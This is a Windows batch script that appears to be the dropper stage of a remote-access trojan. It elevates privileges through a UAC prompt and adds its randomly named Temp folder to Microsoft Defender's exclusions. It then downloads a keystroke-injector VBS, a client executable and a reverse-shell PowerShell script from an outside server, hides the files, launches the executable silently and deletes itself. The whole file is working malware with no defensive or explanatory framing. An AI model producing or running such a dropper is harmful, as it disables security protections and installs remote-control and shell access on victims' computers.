@echo off
::---------------------------------------------------------------------------------------------------------------
::  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
:: --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    ::echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt

    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B

:gotAdmin

    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
    pushd "%CD%"
    CD /D "%~dp0"

::----------------------------------------------------------------------------------------------------------------

setlocal enabledelayedexpansion
:: Set the length of the random string
set LENGTH=7
set CHARSET=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789
set "MainDirName="

for /L %%i in (1,1,%LENGTH%) do (
    set /A "RANDOM_INDEX=!random! %% 62"
    for %%c in (!RANDOM_INDEX!) do (
        set "RANDOM_CHAR=!CHARSET:~%%c,1!"
    )
    set "MainDirName=!MainDirName!!RANDOM_CHAR!"
)
::----------------------------------------------------------------------------------------------------------------

SET TARGETDIR="%USERPROFILE%\AppData\Local\Temp\"
cd %TARGETDIR%

::----------------------------------------------------------------------------------------------------------------
mkdir %MainDirName%
powershell Add-MpPreference -ExclusionPath '%TARGETDIR%\%MainDirName%'
::----------------------------------------------------------------------------------------------------------------
cd %MainDirName%
:: -----------------------------------------------------------cmd-------------------------------------------------------------------------

:: download Keystroke Injector
powershell "Invoke-WebRequest -Uri 'https://arth.imbeddex.com/RAT/hello.vbs' -OutFile payload.vbs"
attrib +h "payload.vbs"
:: payload.vbs

:: -------------------------------------------------------------------------------------------------------------------------------------

:: download client side
powershell "Invoke-WebRequest -Uri 'https://arth.imbeddex.com/RAT/target_script.exe' -OutFile target_script.exe"
attrib +h "target_script.exe"
start /b "application" "%TARGETDIR%\%MainDirName%\target_script.exe"

:: -----------------------------------------------------------ps1--------------------------------------------------------------------------

powershell "Invoke-WebRequest -Uri 'https://arth.imbeddex.com/RAT/Rev_shell.ps1' -OutFile Rev_shell.ps1"
attrib +h "Rev_shell.ps1"
:: powershell -ExecutionPolicy Bypass -WindowStyle hidden -File "C:\Users\Arth\AppData\Local\Temp\%MainDirName%\Rev_shell.ps1"  carefull of "ARTH"

:: -------------------------------------------------------------------------------------------------------------------------------------

:: cd "%~dp0"

::comment to stop self del
del "%~f0"